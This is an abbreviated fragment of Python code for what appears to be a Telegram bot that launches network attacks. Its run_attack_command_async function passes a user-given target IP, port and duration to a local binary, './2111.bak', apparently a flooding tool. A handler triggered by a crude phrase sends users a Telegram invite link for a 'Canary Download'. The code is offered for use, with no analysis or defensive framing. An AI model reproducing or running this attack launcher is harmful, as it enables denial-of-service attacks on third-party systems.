...
FORWARD_CHANNEL_ID = -4677306780
CHANNEL_ID = -4677306780
error_channel_id = -4677306780
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./2111.bak {target_ip} {target_port} {duration} 900")
...
def handle_message(message):
    if message.text == "CHUDAI 💦":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/+zCFtfTNDVQNiN2I1", parse_mode='Markdown')
